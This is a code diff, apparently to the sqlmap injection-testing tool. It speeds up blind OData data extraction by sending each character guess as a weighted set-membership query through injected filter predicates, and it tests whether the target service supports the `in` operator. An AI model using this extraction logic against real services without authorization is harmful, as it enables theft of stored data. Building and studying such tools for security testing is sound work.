@@ -44,8 +44,10 @@ from lib.utils.nonsql import blockedStatus
 from lib.utils.nonsql import ratio as _ratio
 from lib.utils.nonsql import userDecision
 from lib.utils.nonsql import userOracleActive
+from lib.core.settings import HUFFMAN_PRIOR_WEIGHTS
 from lib.core.settings import ODATA_CHAR_MAX
 from lib.core.settings import ODATA_CHAR_MIN
+from lib.core.settings import ODATA_CHARSET_BLOCK
 from lib.core.settings import ODATA_COMMON_FIELDS
 from lib.core.settings import ODATA_ERROR_REGEX
 from lib.core.settings import ODATA_ERROR_SIGNATURES
@@ -78,13 +80,14 @@ _BOUNDARY_TABLE = (
 )
 
 # Charset for blind character recovery.
-# NOTE recovery uses EXACT equality (substring(...) eq 'c'), not a '>=' bisection: .NET / OData string
+# NOTE recovery uses EXACT equality (substring(...) eq 'c'), never a '>=' bisection: .NET / OData string
 # relational comparison is culture-aware and case-folding ('l' and 'L' compare equal), which scrambles a
-# lexicographic bisection, whereas eq is ordinal and exact. So the set is ordered by real-world frequency
-# to keep the linear scan short on typical data rather than by codepoint. Because the scan is exact
-# rather than positional, the order is free and a missing codepoint only costs coverage - it cannot
-# alias onto a neighbour the way a bisection hole does. Nothing is excluded: the one character OData
-# cannot carry raw inside a literal, the single quote, is doubled per the spec instead of dropped.
+# lexicographic bisection, whereas eq is ordinal and exact. Bisection is recovered WITHOUT ordering by
+# asking about a whole candidate set per request (see _memberOf), so the set is ordered by real-world
+# frequency - a common character is settled inside the first block. Because the probe is exact rather
+# than positional, the order is free and a missing codepoint only costs coverage - it cannot alias onto
+# a neighbour the way a bisection hole does. Nothing is excluded: the one character OData cannot carry
+# raw inside a literal, the single quote, is doubled per the spec instead of dropped.
 _FREQ = (tuple(xrange(ord('a'), ord('z') + 1)) + tuple(xrange(ord('A'), ord('Z') + 1)) +
          tuple(xrange(ord('0'), ord('9') + 1)) + tuple(ord(_) for _ in " @._-+:/!#$%&*=?"))
 _CS_ORDS = []
@@ -94,6 +97,24 @@ for _o in _FREQ:
 for _o in xrange(ODATA_CHAR_MIN, ODATA_CHAR_MAX + 1):
     if _o not in _CS_ORDS:
         _CS_ORDS.append(_o)
+
+# ...and weighted by the same shipped character prior blind SQL retrieval banks on, so a set is split
+# at its cumulative-WEIGHT midpoint rather than its midpoint by count. That puts the likely characters
+# nearer the root of the decision tree, which is what beats a uniform bisection's flat log2(charset).
+_CS_WEIGHTS = dict((_o, HUFFMAN_PRIOR_WEIGHTS.get(_o, 1)) for _o in _CS_ORDS)
+_CS_ORDS.sort(key=lambda _o: -_CS_WEIGHTS[_o])
+
+
+def _splitPoint(candidates):
+    """Where to cut `candidates` so that either answer is about equally likely (never degenerate)."""
+
+    half = sum(_CS_WEIGHTS[_] for _ in candidates) / 2.0
+    running = 0
+    for index, ordinal in enumerate(candidates):
+        running += _CS_WEIGHTS[ordinal]
+        if running >= half:
+            return min(index + 1, len(candidates) - 1)
+    return len(candidates) - 1
 
 
 def _literal(ordinal):
@@ -399,13 +420,38 @@ def _findKeyAndEntities(place, parameter, boundary, emptyPage, errorSurface=True
     return None, []
 
 
-def _inferField(oracle, key, keyValue, field, maxLen=ODATA_MAX_LENGTH):
+def _memberOf(oracle, pin, field, pos, ordinals, useIn):
+    """One request asking whether the character at `pos` is ANY of `ordinals`."""
+
+    substring = "substring(%s,%d,1)" % (field, pos)
+    if useIn:
+        return oracle("(%s%s in (%s))" % (pin, substring, ",".join(_literal(_) for _ in ordinals)))
+    return oracle("(%s(%s))" % (pin, " or ".join("%s eq %s" % (substring, _literal(_)) for _ in ordinals)))
+
+
+def _supportsIn(oracle, pin):
+    """Whether the service speaks the v4.01 `in` operator, settled by a differential so one that merely
+    tolerates the syntax cannot fake it. Both spellings ask the identical question, but `in` costs the
+    parser a SINGLE node against ~8 per candidate for the disjunction, and the ceiling is real: ASP.NET
+    Core OData allows 100 nodes by default (MaxNodeCount) and was measured rejecting an 11-term
+    disjunction outright. So `in`, where offered, buys headroom on a service configured stricter than
+    the default rather than a bigger question."""
+
+    try:
+        return oracle("(%s'a' in ('a','b'))" % pin) and not oracle("(%s'a' in ('b','c'))" % pin)
+    except InconclusiveError:
+        return False
+
+
+def _inferField(oracle, key, keyValue, field, maxLen=ODATA_MAX_LENGTH, useIn=None):
     """Blindly recover one string property of the entity pinned by key==keyValue: length by binary
-    search, then each character by bisecting its index in the codepoint-ordered charset. OData substring()
-    is 0-indexed, so character `pos` (1-based) is substring(field,pos-1,1)."""
+    search, then each character by set-membership bisection. OData substring() is 0-indexed, so
+    character `pos` (1-based) is substring(field,pos-1,1)."""
 
     pin = "%s eq %d and " % (key, keyValue)
     try:
+        if useIn is None:
+            useIn = _supportsIn(oracle, pin)
         if not oracle("(%slength(%s) ge 1)" % (pin, field)):
             return ""
         lo, hi = 1, maxLen
@@ -419,12 +465,22 @@ def _inferField(oracle, key, keyValue, field, maxLen=ODATA_MAX_LENGTH):
 
         chars = []
         for pos in xrange(length):
-            # exact-match linear scan (eq is ordinal); frequency order keeps it short on typical values
+            # A whole candidate set is asked about in ONE request, so a probe halves the space just as
+            # a relational bisection would - without ever leaving `eq`, the only comparison .NET does
+            # not case-fold. The weight-ordered blocks are tried in turn, so a likely character is
+            # settled by the first of them and never pays for the rest of the charset.
             recovered = "?"
-            for ordinal in _CS_ORDS:
-                if oracle("(%ssubstring(%s,%d,1) eq %s)" % (pin, field, pos, _literal(ordinal))):
-                    recovered = chr(ordinal)
-                    break
+            for start in xrange(0, len(_CS_ORDS), ODATA_CHARSET_BLOCK):
+                candidates = _CS_ORDS[start:start + ODATA_CHARSET_BLOCK]
+                if not _memberOf(oracle, pin, field, pos, candidates, useIn):
+                    continue
+                while len(candidates) > 1:
+                    # membership in `candidates` is established, so the untested side is implied
+                    cut = _splitPoint(candidates)
+                    candidates = (candidates[:cut] if _memberOf(oracle, pin, field, pos, candidates[:cut], useIn)
+                                  else candidates[cut:])
+                recovered = chr(candidates[0])
+                break
             chars.append(recovered)
     except InconclusiveError:
         logger.warning("OData extraction aborted for '%s' (oracle inconclusive after retries)" % field)
@@ -482,13 +538,19 @@ def _dumpEntities(place, parameter, boundary, emptyPage):
                 % (key, len(keys), "y" if len(keys) == 1 else "ies", ", ".join(fields)))
 
     rows = []
+    useIn = None
     for value in keys:
         oracle = _makeOracle(place, parameter, boundary, truePredicate="(%s eq %d)" % (key, value))
         if oracle is None:
             continue
+        if useIn is None:
+            # a property of the service, not of the entity, so it is settled once for the whole dump
+            useIn = _supportsIn(oracle, "%s eq %d and " % (key, value))
+            logger.debug("service %s the 'in' operator, so one probe covers %d candidate character(s)"
+                         % ("speaks" if useIn else "does not speak", len(_CS_ORDS) if useIn else ODATA_CHARSET_BLOCK))
         row = [str(value)]
         for field in fields[1:]:
-            recovered = _inferField(oracle, key, value, field)
+            recovered = _inferField(oracle, key, value, field, useIn=useIn)
             row.append("?" if recovered is None else recovered)
         rows.append(row)
 
